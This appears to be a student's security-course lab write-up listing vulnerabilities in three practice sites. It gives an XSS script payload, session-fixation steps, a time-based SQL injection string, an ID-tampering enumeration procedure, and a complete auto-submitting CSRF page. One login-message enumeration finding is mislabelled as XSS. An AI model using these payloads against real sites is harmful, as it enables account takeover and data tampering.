# Unit-9-Cybersecurity

# Green:

Vulnerability 1: Cross-Site Scripting (XSS)

Go to Contact section and submit a feedback with <script>alert('XSS
ALERT');</script>
Log into admin and once you click the feedback section, it will trigger a popup

Vulnerability 2: Cross-Site Scripting (XSS)

Go to log in page, if you enter the correct username, but inccorect
password, "Log in was unsuccessful" will be bolded
If you enter an invalid username and incorrect password, it wouldn't be bolded.

# Blue:

Vulnerability 1: Session Hijacking/Fixation

In one browser (Chrome), we log in normally but then copy the current
PHPSESSIONID.
Use another browser (Safari in this case) which was NOT logged in and
change the PHPSESSIONID we got from Chrome.
It will show that it was automatically logged into the system in the
Safari without entering the password and username.

Vulnerability 2: SQL Injection

Go to the salesperson tab
Select a random salesperson and add this at the end of the url ' OR
SLEEP(5)=0--'
The current browser will change in 5 seconds

# Red:

Vulnerability 1: User Enumeration

Log in and then go to sales person's page
Click into any salesperson to get their ID and change it to 11 or 12;
these information shouldn't be public to everyone
Log out and go to the public site
Click into any salesperson and change their ID to 11 or 12 and we will
get that information when public user shouldn't supposed to
<img src="red-exploit-1.gif" alt="Challenge 1">


Vulnerability 2: Cross-Site Request Forgery (CSRF)

Create a html page with the code below

<html>
  <head>
    <title>A Totally Blank Page</title>
  </head>
  <body onload="document.CSRF.submit()">
<form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5"
method="post" style="display: none;" name='CSRF' target="res">
    <input type="text" name="first_name" value="HACKED" />
      <input type="text" name="last_name" value="WAS HACKED" />
      <input type="text" name="phone" value="111-111-2222" />
      <input type="text" name="email" value="HACKED@HACKED.com" />
</form>
    <iframe name="res" style="display: none;"></iframe>
  </body>
</html>


User submit a feedback with a url that links to the html page
Admin log into site and visit the attached feedback url
By visiting the page, it will attack and change salesperson with the ID 5's info


